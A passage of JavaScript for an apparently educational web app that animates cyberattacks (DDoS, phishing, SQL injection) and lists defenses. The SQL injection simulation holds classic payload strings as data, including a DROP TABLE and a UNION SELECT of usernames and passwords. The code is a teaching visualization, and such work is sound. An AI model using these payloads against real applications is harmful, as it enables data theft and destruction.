            { label: 'Blocked IPs', value: '0', live: true },
        ],
        defense: [
            'Regularly update signature databases to protect against new vulnerabilities.',
            'Tune alert rules to minimize false positives and prevent alert fatigue.',
            'Configure IPS mode (active blocking) rather than IDS mode (alert only) on key segments.',
            'Place sensors at both network boundaries (north-south) and internally (east-west).',
            'Correlate IDS alerts with endpoint protection data in a SIEM.',
        ],
        simulate: 'simulateIDS',
    },
    {
        id: 'mfa',
        name: 'Multi-Factor Auth (MFA)',
        icon: '🔑',
        category: 'security',
        severity: 'low',
        tags: ['mfa', 'authentication', 'credentials', 'identity'],
        description: 'Multi-Factor Authentication (MFA) requires users to provide two or more verification factors to gain access, combining credentials from something they know, have, and are to secure system access.',
        accent: '#00bcd4',
        accentDim: 'rgba(0,188,212,0.15)',
        steps: [
            { title: 'Credential Entry', desc: 'User enters primary login credentials (username and password).' },
            { title: 'Directory Match', desc: 'Active Directory verifies the password is correct, then triggers MFA.' },
            { title: 'OTP Generated', desc: 'A secure, time-based token is sent to the user\'s registered authenticator app.' },
            { title: 'Second Factor Prompt', desc: 'Application blocks access, waiting for the user to input the token.' },
            { title: 'Access Approved', desc: 'Token is validated, session cookies are created, and user login completes.' },
        ],
        stats: [
            { label: 'Login Attempts', value: '0', live: true },
            { label: 'MFA Challenges', value: '0', live: true },
            { label: 'Successful Logins', value: '0', live: true },
            { label: 'Bypassed Attempts', value: '0', live: true },
        ],
        defense: [
            'Enforce MFA globally across all corporate systems, email, and VPNs.',
            'Use push notifications or hardware tokens over SMS due to SIM swapping risks.',
            'Deploy context-aware MFA that prompts on location or device changes.',
            'Educate users on "MFA fatigue" attacks (bombarding users with prompts).',
            'Protect service accounts with long, unique credentials and API keys.',
        ],
        simulate: 'simulateMFA',
    },
    {
        id: 'zero-trust',
        name: 'Zero Trust Architecture',
        icon: '🛡️',
        category: 'security',
        severity: 'high',
        tags: ['zero-trust', 'least-privilege', 'microsegmentation', 'never-trust'],
        description: 'Zero Trust operates on the principle of "never trust, always verify." It continuously validates identity, device posture, and context before granting minimal access to specific resources via micro-segmentation.',
        accent: '#4caf50',
        accentDim: 'rgba(76,175,80,0.15)',
        steps: [
            { title: 'Identity & Device Check', desc: 'Validates user credentials, device patching status, and location context.' },
            { title: 'Policy Evaluation', desc: 'Policy Decision Point (PDP) checks access controls and resource permissions.' },
            { title: 'Microsegmentation', desc: 'Restricts user access to only the specific requested application, not the network.' },
            { title: 'Continuous Verification', desc: 'Monitors session behavior continuously, terminating access on anomaly detection.' },
            { title: 'Access Authorized', desc: 'Short-lived encrypted tunnel established to requested resource.' },
        ],
        stats: [
            { label: 'Policy Checks', value: '0', live: true },
            { label: 'Device Status', value: 'COMPLIANT', live: false },
            { label: 'Segments Active', value: '0', live: true },
            { label: 'Requests Blocked', value: '0', live: true },
        ],
        defense: [
            'Adopt micro-segmentation to restrict lateral movement inside the network.',
            'Perform real-time device posture checking before granting system access.',
            'Implement the Principle of Least Privilege (PoLP) for all user accounts.',
            'Encrypt all data in transit (TLS) and data at rest (AES).',
            'Leverage Identity Providers (IdP) for unified authentication control.',
        ],
        simulate: 'simulateZeroTrust',
    },
    {
        id: 'defense-system',
        name: 'Threat Defense System',
        icon: '🛡️',
        category: 'security',
        severity: 'critical',
        tags: ['soc', 'siem', 'soar', 'incident-response'],
        description: 'An integrated Threat Defense System correlates events from endpoint detection (EDR), firewalls, and mail relays, using automated SOAR playbooks to detect, isolate, and neutralize multi-stage security threats.',
        accent: '#3f51b5',
        accentDim: 'rgba(63,81,181,0.15)',
        steps: [
            { title: 'SIEM Log Ingestion', desc: 'Aggregates millions of events from firewalls, DNS, AD, and EDR.' },
            { title: 'Alert Correlation', desc: 'Identifies active attack chains by connecting related anomalous logs.' },
            { title: 'SOAR Containment', desc: 'Triggers automated playbooks to isolate compromised endpoints from the network.' },
            { title: 'Threat Neutralized', desc: 'Stops malicious processes, deletes files, and resets credentials.' },
            { title: 'Policy Hardened', desc: 'Automatically pushes firewall blocklists and EDR rules to prevent reinfection.' },
        ],
        stats: [
            { label: 'Events Processed', value: '0', live: true },
            { label: 'Threats Detected', value: '0', live: true },
            { label: 'Hosts Contained', value: '0', live: true },
            { label: 'Avg Containment Time', value: '—', live: false },
        ],
        defense: [
            'Integrate SIEM and EDR for full visibility across endpoints and networks.',
            'Build and test SOAR playbooks for common scenarios like phishing and ransomware.',
            'Maintain offline, immutable backups for business continuity.',
            'Conduct regular tabletop incident response exercises.',
            'Establish clear escalation paths and communication protocols for breaches.',
        ],
        simulate: 'simulateDefenseSystem',
    },
    {
        id: 'hoax',
        name: 'Hoax Attack',
        icon: '📢',
        category: 'social',
        severity: 'medium',
        tags: ['hoax', 'misinformation', 'social-engineering', 'panic', 'deception'],
        description: 'A hoax attack spreads false warnings or misinformation (e.g., fake virus alerts, fraudulent chain messages, or fabricated security threats) to cause panic, waste resources, trick users into deleting legitimate files, or install actual malware disguised as a "fix."',
        accent: '#e040fb',
        accentDim: 'rgba(224,64,251,0.15)',
        steps: [
            { title: 'Hoax Crafted', desc: 'Attacker creates a convincing fake warning (e.g., "Critical virus found!").' },
            { title: 'Mass Distribution', desc: 'Hoax spread via email, social media, messaging apps, and forums.' },
            { title: 'Panic Induced', desc: 'Recipients believe the hoax and forward it, amplifying reach.' },
            { title: 'Victim Action', desc: 'Users follow malicious instructions: delete system files or install "fix."' },
            { title: 'Damage Realized', desc: 'Systems damaged or actual malware installed through the fake remedy.' },
        ],
        stats: [
            { label: 'Messages Sent', value: '0', live: true },
            { label: 'Users Deceived', value: '0', live: true },
            { label: 'Shares/Forwards', value: '0', live: true },
            { label: 'Systems Damaged', value: '0', live: true },
        ],
        defense: [
            'Verify all security warnings with official vendor sources before acting.',
            'Educate users to recognize hoax patterns (urgency, chain forwarding).',
            'Implement email/messaging filters to block known hoax templates.',
            'Never delete system files based on unverified social media warnings.',
            'Report hoax messages to IT security teams for organization-wide alerts.',
        ],
        simulate: 'simulateHoaxAttack',
    },
    {
        id: 'dictionary',
        name: 'Dictionary Attack',
        icon: '📖',
        category: 'network',
        severity: 'high',
        tags: ['dictionary', 'password', 'wordlist', 'authentication', 'credential-crack'],
        description: 'A dictionary attack systematically tries every word from a precompiled wordlist (dictionary) — including common passwords, phrases, and variations — against a login system or password hash, exploiting users who choose predictable, human-readable passwords.',
        accent: '#ff6d00',
        accentDim: 'rgba(255,109,0,0.15)',
        steps: [
            { title: 'Wordlist Loaded', desc: 'Attacker loads a dictionary file with millions of common passwords and phrases.' },
            { title: 'Target Identified', desc: 'Login endpoint or password hash file identified for attack.' },
            { title: 'Sequential Testing', desc: 'Each word from the dictionary is tested as a password sequentially.' },
            { title: 'Variation Mutations', desc: 'Common mutations applied (P@ssword, password123, PASSWORD!).' },
            { title: 'Credential Cracked', desc: 'Weak dictionary-based password matched — unauthorized access gained.' },
        ],
        stats: [
            { label: 'Words Tried', value: '0', live: true },
            { label: 'Words/sec', value: '0', live: true },
            { label: 'Matches Found', value: '0', live: true },
            { label: 'Wordlist Size', value: '14.3M', live: false },
        ],
        defense: [
            'Enforce minimum 12-character passwords with complexity requirements.',
            'Implement account lockout or progressive delays after failed attempts.',
            'Use password blacklists to block known common/dictionary passwords.',
            'Enable Multi-Factor Authentication (MFA) on all accounts.',
            'Deploy CAPTCHA on login forms to prevent automated attacks.',
        ],
        simulate: 'simulateDictionaryAttack',
    },
];

ATTACKS.sort((a, b) => a.name.localeCompare(b.name));

const state = {
    activeFilter: 'all',
    currentAttack: null,
    simRunning: false,
    simTimers: [],
    simFrame: null,
    simulationsRun: 2847,
    threatsAnalyzed: 156000,
};

const $ = (id) => document.getElementById(id);
const dom = {
    grid: null,
    modal: null,
    simIcon: null,
    simTitle: null,
    simSeverity: null,
    simDescription: null,
    simStepsList: null,
    simStatsList: null,
    simDefenseList: null,
    simCanvas: null,
    simDomLayer: null,
    simProgress: null,
    simProgressLabel: null,
    simTerminalBody: null,
    simStart: null,
    simStop: null,
    simReset: null,
    simClose: null,
    typedText: null,
};

document.addEventListener('DOMContentLoaded', () => {
    dom.grid = $('attacks-grid');
    dom.modal = $('sim-modal');
    dom.simIcon = $('sim-icon');
    dom.simTitle = $('sim-title');
    dom.simSeverity = $('sim-severity');
    dom.simDescription = $('sim-description');
    dom.simStepsList = $('sim-steps-list');
    dom.simStatsList = $('sim-stats-list');
    dom.simDefenseList = $('sim-defense-list');
    dom.simCanvas = $('sim-canvas');
    dom.simDomLayer = $('sim-dom-layer');
    dom.simProgress = $('sim-progress');
    dom.simProgressLabel = $('sim-progress-label');
    dom.simTerminalBody = $('sim-terminal-body');
    dom.simStart = $('sim-start');
    dom.simStop = $('sim-stop');
    dom.simReset = $('sim-reset');
    dom.simClose = $('sim-close');
    dom.typedText = $('typed-text');

    renderCards();
    const statAttacks = $('stat-attacks');
    if (statAttacks) statAttacks.textContent = ATTACKS.length;
    setupFilters();
    setupModal();
    setupNavbar();
    runTypingEffect();
    animateCounters();
    setupCardMouseTracking();
    animateCyberGlobe();
    populateMarquee();
});

function populateMarquee() {
    const marquee = document.querySelector('.threat-marquee');
    if (!marquee) return;
    let itemsHtml = '';
    ATTACKS.forEach(attack => {
        const dotColor = attack.severity === 'critical' ? 'red' : attack.severity === 'high' ? 'yellow' : 'green';
        itemsHtml += `<span class="threat-item"><span class="dot ${dotColor}"></span> ${attack.name.toUpperCase()} DETECTED</span>`;
    });
    marquee.innerHTML = itemsHtml + itemsHtml;
}

let lastThreatTick = 0;
function tickThreats(now) {
    if (!state.simRunning) return;
    if (now - lastThreatTick > 100) {
        const amount = rndInt(15, 65);
        state.threatsAnalyzed += amount;
        const threatEl = document.querySelector('#stat-threats .counter');
        if (threatEl) {
            threatEl.textContent = Math.floor(state.threatsAnalyzed / 1000).toLocaleString();
        }
        lastThreatTick = now;
    }
    requestAnimationFrame(tickThreats);
}

function incrementSimulations() {
    state.simulationsRun++;
    const simEl = document.querySelector('#stat-simulations .counter');
    if (simEl) {
        simEl.textContent = state.simulationsRun.toLocaleString();
    }
}

function renderCards(filter) {
    if (!filter) filter = 'all';
    dom.grid.innerHTML = '';
    const filtered = filter === 'all' ? ATTACKS : ATTACKS.filter(a => a.category === filter);

    filtered.forEach((attack, i) => {
        const card = document.createElement('div');
        card.className = 'attack-card';
        card.setAttribute('data-category', attack.category);
        card.setAttribute('data-id', attack.id);
        card.style.setProperty('--card-accent', attack.accent);
        card.style.setProperty('--card-accent-dim', attack.accentDim);
        card.style.animationDelay = `${i * 0.07}s`;

        card.innerHTML = `
            <div class="card-header">
                <div class="card-icon">${attack.icon}</div>
                <span class="severity-badge ${attack.severity}">${attack.severity}</span>
            </div>
            <h3 class="card-title">${attack.name}</h3>
            <p class="card-description">${attack.description}</p>
            <div class="card-tags">
                ${attack.tags.map(t => `<span class="card-tag">${t}</span>`).join('')}
            </div>
            <div class="card-footer">
                <span class="card-category">${attack.category}</span>
                <button class="launch-btn" id="btn-${attack.id}">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                    Simulate
                </button>
            </div>
        `;

        card.addEventListener('click', () => openModal(attack));
        dom.grid.appendChild(card);
    });
}

function setupFilters() {
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            state.activeFilter = btn.dataset.filter;
            renderCards(state.activeFilter);
        });
    });
}

function setupCardMouseTracking() {
    document.addEventListener('mousemove', (e) => {
        document.querySelectorAll('.attack-card').forEach(card => {
            const rect = card.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            card.style.setProperty('--mouse-x', `${x}%`);
            card.style.setProperty('--mouse-y', `${y}%`);
        });
    });
}

function setupModal() {
    dom.simClose.addEventListener('click', closeModal);
    dom.modal.addEventListener('click', (e) => {
        if (e.target === dom.modal) closeModal();
    });
    dom.simStart.addEventListener('click', startSimulation);
    dom.simStop.addEventListener('click', stopSimulation);
    dom.simReset.addEventListener('click', resetSimulation);
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closeModal();
    });
}

function openModal(attack) {
    state.currentAttack = attack;
    resetSimulation();

    dom.simIcon.textContent = attack.icon;
    dom.simIcon.style.background = attack.accentDim;
    dom.simTitle.textContent = attack.name;
    dom.simTitle.style.color = attack.accent;

    dom.simSeverity.textContent = attack.severity.toUpperCase();
    dom.simSeverity.className = `sim-severity ${attack.severity}`;

    dom.simDescription.textContent = attack.description;

    dom.simStepsList.innerHTML = attack.steps.map((step, i) => `
        <div class="step-item" id="step-${i}">
            <div class="step-indicator">
                <div class="step-dot"></div>
                ${i < attack.steps.length - 1 ? '<div class="step-line"></div>' : ''}
            </div>
            <div class="step-content">
                <div class="step-title">${step.title}</div>
                <div class="step-desc">${step.desc}</div>
            </div>
        </div>
    `).join('');

    dom.simStatsList.innerHTML = attack.stats.map((s, i) => `
        <div class="stat-item">
            <span class="stat-item-label">${s.label}</span>
            <span class="stat-item-value" id="live-stat-${i}">${s.value}</span>
        </div>
    `).join('');

    dom.simDefenseList.innerHTML = attack.defense.map(d => `
        <div class="defense-item">
            <span class="defense-icon">✓</span>
            <span>${d}</span>
        </div>
    `).join('');

    dom.simTerminalBody.innerHTML = `
        <div class="terminal-line">> CyberShield v2.0 — Attack Simulation Engine Ready</div>
        <div class="terminal-line">> Loading module: <span style="color:var(--cyan)">${attack.name}</span></div>
        <div class="terminal-line">> Press START to launch simulation...</div>
    `;

    clearCanvas();
    dom.simDomLayer.innerHTML = '';

    dom.modal.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    stopSimulation();
    dom.modal.classList.remove('active');
    document.body.style.overflow = '';
    state.currentAttack = null;
}

function startSimulation() {
    if (state.simRunning || !state.currentAttack) return;
    state.simRunning = true;
    dom.simStart.disabled = true;
    dom.simStop.disabled = false;
    incrementSimulations();
    lastThreatTick = performance.now();
    requestAnimationFrame(tickThreats);
    termLog('> Simulation STARTED — monitoring attack vector...', 'info');
    const fn = window[state.currentAttack.simulate];
    if (typeof fn === 'function') fn();
}

function stopSimulation(isManual = false) {
    const manualStop = (isManual === true) || (isManual instanceof Event);
    state.simRunning = false;
    state.simTimers.forEach(t => clearTimeout(t));
    state.simTimers = [];
    if (state.simFrame) { cancelAnimationFrame(state.simFrame); state.simFrame = null; }
    dom.simStart.disabled = false;
    dom.simStop.disabled = true;
    if (manualStop && state.currentAttack && dom.simTerminalBody.children.length > 3) {
        termLog('> Simulation STOPPED by user.', 'warning');
    }
}

function resetSimulation() {
    stopSimulation();
    setProgress(0);
    document.querySelectorAll('.step-item').forEach(el => el.classList.remove('active', 'completed'));
    if (state.currentAttack) {
        state.currentAttack.stats.forEach((s, i) => {
            const el = $(`live-stat-${i}`);
            if (el) el.textContent = s.value;
        });
    }
    clearCanvas();
    if (dom.simDomLayer) dom.simDomLayer.innerHTML = '';
    dom.simTerminalBody.innerHTML = `<div class="terminal-line">> CyberShield v2.0 — Reset complete. Ready to simulate.</div>`;
}

function termLog(msg, type) {
    if (!type) type = '';
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    line.textContent = msg;
    dom.simTerminalBody.appendChild(line);
    dom.simTerminalBody.scrollTop = dom.simTerminalBody.scrollHeight;
}

function setProgress(pct) {
    dom.simProgress.style.width = `${pct}%`;
    dom.simProgressLabel.textContent = `${Math.round(pct)}%`;
}

function activateStep(index) {
    for (let i = 0; i < index; i++) {
        const el = $(`step-${i}`);
        if (el) { el.classList.remove('active'); el.classList.add('completed'); }
    }
    const el = $(`step-${index}`);
    if (el) el.classList.add('active');
}

function simTimeout(fn, ms) {
    const t = setTimeout(fn, ms);
    state.simTimers.push(t);
    return t;
}

function getCanvas() {
    const canvas = dom.simCanvas;
    canvas.width = canvas.offsetWidth;
    canvas.height = canvas.offsetHeight;
    const ctx = canvas.getContext('2d');
    return { canvas, ctx, w: canvas.width, h: canvas.height };
}

function clearCanvas() {
    const canvas = dom.simCanvas;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
}

function rnd(min, max) { return Math.random() * (max - min) + min; }
function rndInt(min, max) { return Math.floor(rnd(min, max)); }

function runTypingEffect() {
    const phrases = [
        'Visualizing cyber threats in real-time.',
        'Understanding attacks to build better defenses.',
        'Educational simulations. No real systems harmed.',
    ];
    let pi = 0, ci = 0, deleting = false;
    const el = dom.typedText;

    function type() {
        const phrase = phrases[pi];
        if (!deleting) {
            el.innerHTML = phrase.slice(0, ci + 1) + '<span class="cursor"></span>';
            ci++;
            if (ci === phrase.length) { deleting = true; setTimeout(type, 2200); return; }
        } else {
            el.innerHTML = phrase.slice(0, ci - 1) + '<span class="cursor"></span>';
            ci--;
            if (ci === 0) { deleting = false; pi = (pi + 1) % phrases.length; }
        }
        setTimeout(type, deleting ? 40 : 65);
    }
    type();
}

function animateCounters() {
    document.querySelectorAll('.counter').forEach(el => {
        const target = parseInt(el.dataset.target);
        const start = performance.now();
        const dur = 2000;
        function tick(now) {
            const t = Math.min((now - start) / dur, 1);
            const ease = 1 - Math.pow(1 - t, 4);
            el.textContent = Math.round(target * ease).toLocaleString();
            if (t < 1) requestAnimationFrame(tick);
        }
        requestAnimationFrame(tick);
    });
}

function setupNavbar() {
    const navbar = $('navbar');
    window.addEventListener('scroll', () => {
        navbar.classList.toggle('scrolled', window.scrollY > 50);
        ['dashboard', 'attacks', 'about'].forEach(id => {
            const section = $(id);
            if (!section) return;
            const rect = section.getBoundingClientRect();
            const link = document.querySelector(`[data-section="${id}"]`);
            if (link) link.classList.toggle('active', rect.top <= 100 && rect.bottom > 100);
        });
    });
}

function animateCyberGlobe() {
    const globe = $('cyber-globe');
    if (!globe) return;
    globe.style.cssText = `
        width:300px;height:300px;border-radius:50%;position:relative;
        border:1px solid rgba(0,240,255,0.15);
        box-shadow:0 0 60px rgba(0,240,255,0.1),inset 0 0 60px rgba(0,240,255,0.05);
        background:radial-gradient(circle at 35% 35%,rgba(0,240,255,0.08) 0%,transparent 70%);
        animation:globeSpin 30s linear infinite;
    `;
    for (let i = 0; i < 4; i++) {
        const ring = document.createElement('div');
        ring.style.cssText = `position:absolute;inset:${i*18}px;border-radius:50%;border:1px solid rgba(0,240,255,${0.12 - i*0.02});transform:rotate(${i*45}deg) rotateX(${i*40}deg);`;
        globe.appendChild(ring);
    }
    for (let i = 0; i < 8; i++) {
        const blip = document.createElement('div');
        const phi = rnd(0, Math.PI * 2), theta = rnd(0.2, Math.PI - 0.2), r = 130;
        const x = r * Math.sin(theta) * Math.cos(phi) + 150;
        const y = r * Math.sin(theta) * Math.sin(phi) + 150;
        blip.style.cssText = `position:absolute;width:6px;height:6px;border-radius:50%;left:${x}px;top:${y}px;transform:translate(-50%,-50%);background:var(--cyan);box-shadow:0 0 8px var(--cyan);animation:statusPulse ${rnd(1.5,3).toFixed(1)}s ease-in-out ${rnd(0,2).toFixed(1)}s infinite;`;
        globe.appendChild(blip);
    }
    if (!$('globe-style')) {
        const s = document.createElement('style');
        s.id = 'globe-style';
        s.textContent = '@keyframes globeSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}';
        document.head.appendChild(s);
    }
}

window.simulateDDoS = function() {
    termLog('> Activating botnet command channels...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    const bots = [];
    const server = { x: w / 2, y: h / 2, r: 28, health: 100 };

    for (let i = 0; i < 60; i++) {
        const angle = rnd(0, Math.PI * 2);
        const dist = rnd(80, Math.min(w, h) / 2 - 40);
        bots.push({ x: w/2+Math.cos(angle)*dist, y: h/2+Math.sin(angle)*dist, angle, dist, color: `hsl(${rndInt(0,30)},100%,60%)`, packets: [], fireRate: rndInt(30,80), tick: rndInt(0,80) });
    }

    activateStep(0);
    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> 50,000 bots activated. Flooding target...', 'error'); }, 800);

    let frame = 0, reqSec = 0, totalReqs = 0;

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);

        const bg = ctx.createRadialGradient(w/2, h/2, 0, w/2, h/2, Math.min(w,h)/2);
        bg.addColorStop(0, 'rgba(20,5,5,0.9)');
        bg.addColorStop(1, 'rgba(6,10,19,0)');
        ctx.fillStyle = bg; ctx.fillRect(0, 0, w, h);

        const hc = server.health > 50 ? '#39ff14' : server.health > 20 ? '#ffaa00' : '#ff3b3b';
        ctx.beginPath();
        ctx.arc(server.x, server.y, server.r+8, -Math.PI/2, -Math.PI/2+(server.health/100)*Math.PI*2);
        ctx.strokeStyle = hc; ctx.lineWidth = 3; ctx.stroke();

        ctx.beginPath();
        ctx.arc(server.x, server.y, server.r, 0, Math.PI*2);
        ctx.fillStyle = `rgba(255,59,59,${0.15+(1-server.health/100)*0.3})`; ctx.fill();
        ctx.strokeStyle = '#ff3b3b'; ctx.lineWidth = 2; ctx.stroke();

        ctx.fillStyle = '#fff'; ctx.font = 'bold 11px monospace'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
        ctx.fillText('SERVER', server.x, server.y-6);
        ctx.fillStyle = hc; ctx.font = '10px monospace';
        ctx.fillText(`${Math.round(server.health)}%`, server.x, server.y+8);

        bots.forEach(bot => {
            bot.tick++;
            bot.angle += 0.003;
            bot.x = w/2 + Math.cos(bot.angle)*bot.dist;
            bot.y = h/2 + Math.sin(bot.angle)*bot.dist;
            if (bot.tick % bot.fireRate === 0) { bot.packets.push({x:bot.x,y:bot.y,progress:0,size:rnd(2,5)}); reqSec++; totalReqs++; }
            ctx.beginPath(); ctx.arc(bot.x,bot.y,5,0,Math.PI*2); ctx.fillStyle=bot.color; ctx.fill();
            bot.packets = bot.packets.filter(pkt => {
                pkt.progress += 0.03;
                const px = bot.x+(server.x-bot.x)*pkt.progress, py = bot.y+(server.y-bot.y)*pkt.progress;
                ctx.beginPath(); ctx.arc(px,py,pkt.size*(1-pkt.progress*0.5),0,Math.PI*2);
                ctx.fillStyle = `rgba(255,80,80,${1-pkt.progress})`; ctx.fill();
                if (pkt.progress >= 1) { server.health = Math.max(0, server.health-0.05); return false; }
                return true;
            });
        });

        if (frame % 30 === 0) {
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=(reqSec*1000).toLocaleString();
            if(e1)e1.textContent=Math.min(50000,frame*300).toLocaleString();
            if(e2)e2.textContent=`${(totalReqs/8000).toFixed(1)} Gbps`;
            if(e3)e3.textContent=`${Math.min(100,Math.round(100-server.health))}%`;
            reqSec=0;
            setProgress(Math.min(100,(frame/400)*100));
        }
        if(frame===100){activateStep(2);termLog('> Server CPU at 100%. Bandwidth saturated!','error');}
        if(frame===200){activateStep(3);termLog('> Service UNAVAILABLE — legitimate users blocked.','error');}
        if(frame===300){activateStep(4);termLog('> Attack sustained. Deploy CDN / rate-limiting!','warning');}
        if(frame>=400){setProgress(100);termLog('> Simulation complete. DDoS attack demonstrated.','success');stopSimulation();return;}
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulatePhishing = function() {
    termLog('> Crafting spoofed email campaign...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    const emailSymbols = [];
    let emailsSent = 0, credsSt = 0;
    activateStep(0);
    simTimeout(() => { if(!state.simRunning)return; activateStep(1); termLog('> Phishing email crafted — spoofed sender.','warning'); }, 600);
    simTimeout(() => { if(!state.simRunning)return; activateStep(2); termLog('> Sending mass phishing campaign...','error'); }, 1400);

    const inboxW = Math.min(w*0.42,240), inboxH = h*0.55, inboxX = 15, inboxY = (h-inboxH)/2;

    function drawInbox() {
        ctx.fillStyle='rgba(10,15,30,0.9)'; ctx.strokeStyle='rgba(0,240,255,0.15)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(inboxX,inboxY,inboxW,inboxH,8); ctx.fill(); ctx.stroke();
        ctx.fillStyle='rgba(0,240,255,0.08)'; ctx.fillRect(inboxX,inboxY,inboxW,28);
        ctx.fillStyle='#8892a8'; ctx.font='11px monospace'; ctx.textAlign='left';
        ctx.fillText('INBOX', inboxX+10, inboxY+18);
    }

    function drawFakeSite() {
        const sx=inboxX+inboxW+15, sy=(h-190)/2, sw=w-sx-15, sh=190;
        ctx.fillStyle='rgba(10,15,30,0.9)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(sx,sy,sw,sh,8); ctx.fill(); ctx.stroke();
        ctx.fillStyle='rgba(255,170,0,0.1)'; ctx.fillRect(sx,sy,sw,24);
        ctx.fillStyle='#ffaa00'; ctx.font='9px monospace'; ctx.textAlign='left';
        ctx.fillText('http://bank-1ogin.com/secure', sx+8, sy+15);
        ctx.fillStyle='#e8ecf4'; ctx.font='bold 12px Inter'; ctx.textAlign='center';
        ctx.fillText('Bank Login Portal', sx+sw/2, sy+50);
        ['Username','Password'].forEach((label,i)=>{
            const fy=sy+70+i*44;
            ctx.fillStyle='#525c70'; ctx.font='9px monospace'; ctx.textAlign='left'; ctx.fillText(label,sx+15,fy-2);
            ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(sx+15,fy+2,sw-30,20,4); ctx.fill(); ctx.stroke();
        });
        ctx.fillStyle='rgba(255,170,0,0.85)'; ctx.beginPath(); ctx.roundRect(sx+15,sy+155,sw-30,22,4); ctx.fill();
        ctx.fillStyle='#060a13'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
        ctx.fillText('LOGIN', sx+sw/2, sy+170);
    }

    let frame = 0;
    function draw() {
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        drawInbox(); drawFakeSite();

        if(frame%12===0 && emailsSent<200){
            emailSymbols.push({x:rnd(inboxX+5,inboxX+inboxW-50),y:inboxY+30,vy:rnd(0.5,1.5),alpha:1,color:Math.random()>0.66?'#ff3b3b':'#ffaa00',text:['URGENT: Verify Account','Bank Alert !!','Acc suspended','Click now!'][rndInt(0,4)]});
            emailsSent++;
        }

        emailSymbols.forEach(e=>{
            e.y+=e.vy; e.alpha-=0.004;
            ctx.globalAlpha=Math.max(0,e.alpha);
            ctx.fillStyle=e.color; ctx.font='8px monospace'; ctx.textAlign='left';
            ctx.fillText(e.text,e.x,e.y);
            ctx.globalAlpha=1;
        });
        emailSymbols.splice(0,emailSymbols.filter(e=>e.alpha<=0).length);

        if(frame>120&&frame%60===0){credsSt++;activateStep(3);termLog(`> Credential captured: user${credsSt}@example.com / ******`,'error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(10000,emailsSent*50).toLocaleString();
            if(e1)e1.textContent=emailsSent > 0 ? `${Math.min(15, Math.round(15 * (frame/200)))}%` : '0%';
            if(e2)e2.textContent=credsSt;
            if(e3)e3.textContent=emailsSent > 0 ? `${Math.min(4, Math.round(4 * (frame/200)))}%` : '0%';
            setProgress(Math.min(100,(frame/350)*100));
        }
        if(frame===160){activateStep(4);termLog('> Victim submitted credentials to fake site!','error');}
        if(frame>=350){setProgress(100);termLog('> Simulation done. Enable MFA to defend!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateSQLi = function() {
    termLog('> Scanning web application for injection points...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const payloads = ["' OR '1'='1","'; DROP TABLE users; --","' UNION SELECT username,password FROM users --","' OR 1=1 LIMIT 100 --","admin'--"];
    const records = ['admin | $2b$10$hash1 | admin@corp.com','john_doe | $2b$10$hash2 | jdoe@corp.com','alice | $2b$10$hash3 | alice@corp.com','root | $2b$10$hash4 | root@sys.com','svc_acct | $2b$10$hash5 | svc@corp.com'];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog(`> Payload: ${payloads[0]}`,'error');},500);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Query injected — bypassing authentication...','error');},1200);

    let frame=0, extractedRows=[];

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.95)'; ctx.fillRect(0,0,w,h);

        const boxW=Math.min(600,w-40), boxX=(w-boxW)/2;
        ctx.fillStyle='rgba(0,240,255,0.05)'; ctx.strokeStyle='rgba(0,240,255,0.2)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(boxX,15,boxW,36,6); ctx.fill(); ctx.stroke();

        const payload=payloads[Math.min(Math.floor(frame/80),payloads.length-1)];
        const dp=payload.slice(0,Math.min(payload.length,Math.floor(frame/3)));
        ctx.fillStyle='#ff3b3b'; ctx.font='13px JetBrains Mono,monospace'; ctx.textAlign='left';
        ctx.fillText(`Search: ${dp}`,boxX+12,39);
        if(frame%60<30){const tw=ctx.measureText(`Search: ${dp}`).width;ctx.fillStyle='#00f0ff';ctx.fillRect(boxX+12+tw,24,2,16);}

        if(frame>40){
            ctx.fillStyle='rgba(0,0,0,0.3)'; ctx.fillRect(boxX,65,boxW,50);
            ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
            ctx.fillText("SELECT * FROM users WHERE name=",boxX+8,84);
            ctx.fillStyle='#ff3b3b'; ctx.fillText(`'${dp}'`,boxX+8+ctx.measureText("SELECT * FROM users WHERE name=").width,84);
